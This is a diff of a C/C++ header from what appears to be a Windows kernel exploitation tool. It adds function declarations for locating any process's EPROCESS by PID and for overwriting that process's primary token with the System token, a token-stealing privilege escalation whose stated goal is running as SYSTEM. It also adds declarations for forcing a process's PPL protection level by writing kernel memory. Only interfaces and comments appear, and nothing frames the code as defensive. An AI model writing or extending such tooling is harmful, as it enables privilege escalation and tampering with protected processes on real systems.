@@ -30,9 +30,25 @@ ULONG WindowVadPatchCount();
 // have their VAD truncated (see PrefaultWindow()).
 ULONG WindowResidentChunks();
 
-// Locate our EPROCESS through the window, falling back to recovering the
+// Locate any EPROCESS by PID through the window, falling back to recovering the
 // PsActiveProcessHead from the System process when the PDB RVA is wrong.
+bool WindowFindEprocessByPid(ULONG64 systemCr3, KernelOffsets* offsets, DWORD pid,
+                             bool verbose, ULONG64* outEprocVA);
+
 bool WindowFindOurEprocess(ULONG64 systemCr3, KernelOffsets* offsets, ULONG64* outEprocVA);
+
+// The System process's primary token object (a kernel pointer), and the write
+// that points any EPROCESS's primary token at it.
+ULONG64 WindowSystemToken(ULONG64 systemCr3, KernelOffsets* offsets);
+bool WindowSetProcessToken(ULONG64 systemCr3, KernelOffsets* offsets,
+                           ULONG64 eprocVA, ULONG64 systemToken, const char* what);
+
+// Read an EPROCESS's current Protection byte (0 if it does not translate).
+BYTE WindowGetProcessProtection(ULONG64 systemCr3, KernelOffsets* offsets, ULONG64 eprocVA);
+
+// Set an EPROCESS's Protection byte, read back to prove the write landed.
+bool WindowSetProcessPpl(ULONG64 systemCr3, KernelOffsets* offsets,
+                         ULONG64 eprocVA, BYTE level);
 
 // Make the *process* run as SYSTEM, not just this thread.
 //
